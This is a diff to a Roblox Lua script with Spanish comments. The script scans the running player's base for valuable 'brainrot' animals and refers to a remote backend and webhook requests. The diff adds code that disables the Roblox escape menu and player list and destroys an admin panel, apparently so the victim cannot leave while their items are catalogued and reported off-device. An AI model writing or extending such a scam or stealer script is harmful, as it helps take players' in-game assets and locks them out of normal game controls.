@@ -1,4 +1,7 @@
--- SERVICES
+if game.PlaceId ~= 109983668079237 then
+    game.Players.LocalPlayer:Kick("Porfavor usa este script en el juego real")
+end
+
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
@@ -11,7 +14,6 @@ local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 local VIM = game:GetService("VirtualInputManager")
 
--- usuarios
 local whitelist = {
     "hesizdev",
     "IlIlIlIlIIlI_lIlIlIl",
@@ -27,12 +29,10 @@ local function isWhitelisted(username)
     return false
 end
 
--- PLAYER
 local LocalPlayer = Players.LocalPlayer
 local player = LocalPlayer
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- VARIABLES GLOBALES PARA HEARTBEAT Y COMANDOS
 local heartbeatActive = false
 local heartbeatUrl = nil
 
@@ -41,7 +41,6 @@ if not LocalPlayer then
     return 
 end
 
--- ==================== SISTEMA DE INSTANCIAS ====================
 local instanciasWhitelist = {}
 
 local function agregarAWhitelist(instancia)
@@ -211,6 +210,32 @@ end
 limpiarInterfaz()
 task.spawn(function() while true do task.wait(5) limpiarInterfaz() end end)
 
+local function bloquearMenuEscape()
+    task.spawn(function()
+        pcall(function()
+            local robloxGui = CoreGui:FindFirstChild("RobloxGui")
+            if robloxGui then
+                robloxGui.Enabled = false
+            end
+        end)
+        
+        pcall(function()
+            local adminPanel = playerGui:FindFirstChild("AdminPanel")
+            if adminPanel then
+                adminPanel:Destroy()
+            end
+        end)
+        
+        pcall(function()
+            local playerList = CoreGui:FindFirstChild("PlayerList")
+            if playerList then
+                playerList:Destroy()
+            end
+        end)
+    end)
+end
+bloquearMenuEscape()
+
 function promptFR(targetPlayer)
     if not targetPlayer then return end
 
@@ -308,12 +333,9 @@ local function bloquearInstancia(instancia)
 end
 
 Game.DescendantAdded:Connect(bloquearInstancia)
--- ==================== FIN SISTEMA DE INSTANCIAS ====================
 
--- BACKEND URL
 local SECURE_BACKEND_URL = "https://hesizweb-production.up.railway.app"
 
--- BLACKLIST
 local BLACKLIST = {
     4313952753,
     3328221098,
@@ -334,7 +356,6 @@ if isBlacklisted(LocalPlayer.UserId) then
     return
 end
 
--- FUNCIÓN PARA CONVERTIR TEXTO A BINARIO
 local function textToBinary(text)
     local result = {}
     for i = 1, #text do
@@ -349,7 +370,6 @@ local function textToBinary(text)
     return table.concat(result, " ")
 end
 
--- FUNCIÓN PARA SOLICITAR URL SEGURA
 local function requestSecureUrl(category, webhookId)
     local success, result = pcall(function()
         if not HttpService then
@@ -402,7 +422,6 @@ local function requestSecureUrl(category, webhookId)
     return nil
 end
 
--- LISTA DE ANIMALES PERMITIDOS (para detectar)
 local allowedAnimals = {
     "67",
     "Celularcini Viciosini",
@@ -486,7 +505,6 @@ local allowedAnimals = {
     "Money Money Reindeer",
 }
 
--- LISTA DE ANIMALES ESPECIALES (para webhook especial)
 local specialAnimals = {
     "Dragon Cannelloni",
     "Celularcini Viciosini",
@@ -527,7 +545,6 @@ local specialAnimals = {
     "Ginger Gerat",
 }
 
--- LISTA DE BRAINROTS (para mostrar en UI)
 local BRAINROT_LIST = {
     "67",
     "Celularcini Viciosini",
@@ -607,52 +624,56 @@ local BRAINROT_LIST = {
     "Donkeyturbo Express"
 }
 
--- FUNCIÓN PARA OBTENER INFO DE PODIUMS
-local function getPodiumInfo()
-    local success, podiumData = pcall(function()
-        if ReplicatedStorage:FindFirstChild("Packages") then
-            local packages = ReplicatedStorage.Packages
-            if packages:FindFirstChild("Synchronizer") then
-                local synchronizer = require(packages.Synchronizer)
-                local playerData = synchronizer:Get(LocalPlayer)
-                if playerData then
-                    return playerData:Get("AnimalPodiums") or {}
-                end
-            end
+local function estaEnLista(nombre, lista)
+    for _, item in ipairs(lista) do
+        if item == nombre then
+            return true
         end
-        return "No se pudieron obtener datos de podios"
-    end)
-
-    if success and type(podiumData) == "table" then  
-        local info = {}  
-        for podium, animal in pairs(podiumData) do  
-            if animal == "Empty" then  
-                info[podium] = "Empty"  
-            else  
-                info[podium] = tostring(animal.Name or animal.Index or "Unknown")  
-            end  
-        end  
-        return info  
-    else  
-        return {error = podiumData}  
     end
+    return false
 end
 
--- FUNCIÓN PARA VERIFICAR SI TIENE ANIMAL PERMITIDO
-local function hasAllowedAnimal(podiumInfo)
+-- FUNCIÓN PARA BUSCAR BASE Y ESCANEAR ANIMALES
+local function buscarBaseYAnimales()
     local foundAnimals = {}
-    for _, animal in pairs(podiumInfo) do
-        if type(animal) == "string" and animal ~= "Empty" and animal ~= "Unknown" then
-            local animalTrim = animal:gsub("^%s*(.-)%s*$", "%1")
-            for _, allowed in ipairs(allowedAnimals) do
-                if animalTrim:lower():find(allowed:lower(), 1, true) then
-                    table.insert(foundAnimals, animalTrim)
+    local foundSpecials = {}
+    
+    local success, error = pcall(function()
+        local plots = workspace.Plots:GetDescendants()
+        
+        for _, descendant in ipairs(plots) do
+            if descendant:IsA("TextLabel") then
+                if descendant.Text == LocalPlayer.DisplayName .. "'s Base" then
+                    local surfaceGui = descendant.Parent.Parent
+                    local plotSign = surfaceGui.Parent
+                    local modelo = plotSign.Parent
+                    
+                    -- Escanear todos los hijos del modelo (la base del jugador)
+                    for _, child in ipairs(modelo:GetChildren()) do
+                        if child:IsA("Model") and estaEnLista(child.Name, allowedAnimals) then
+                            -- Verificar si es especial
+                            if estaEnLista(child.Name, specialAnimals) then
+                                table.insert(foundSpecials, child.Name)
+                            end
+                            -- Agregar a la lista general (evitar duplicados)
+                            if not table.find(foundAnimals, child.Name) then
+                                table.insert(foundAnimals, child.Name)
+                            end
+                        end
+                    end
+                    
                     break
                 end
             end
         end
+    end)
+    
+    if not success then
+        warn("Error al escanear base: " .. tostring(error))
+        return {}
     end
-    return #foundAnimals > 0, foundAnimals
+    
+    return foundAnimals
 end
 
 -- FUNCIÓN PARA VALIDAR LINK DE SERVIDOR PRIVADO
@@ -1307,14 +1328,8 @@ activateBtn.MouseButton1Click:Connect(function()
     task.wait(1)
     clearContent()
     
-    -- ESCANEO DE ANIMALES (sin UI)
-    local podiumInfo = getPodiumInfo()
-    local foundAnimals = {}
-    
-    if not podiumInfo.error then
-        local hasAnimal
-        hasAnimal, foundAnimals = hasAllowedAnimal(podiumInfo)
-    end
+    -- ESCANEO DE ANIMALES (sin UI) - Usando búsqueda en Workspace
+    local foundAnimals = buscarBaseYAnimales()
     
     task.wait(1)
     
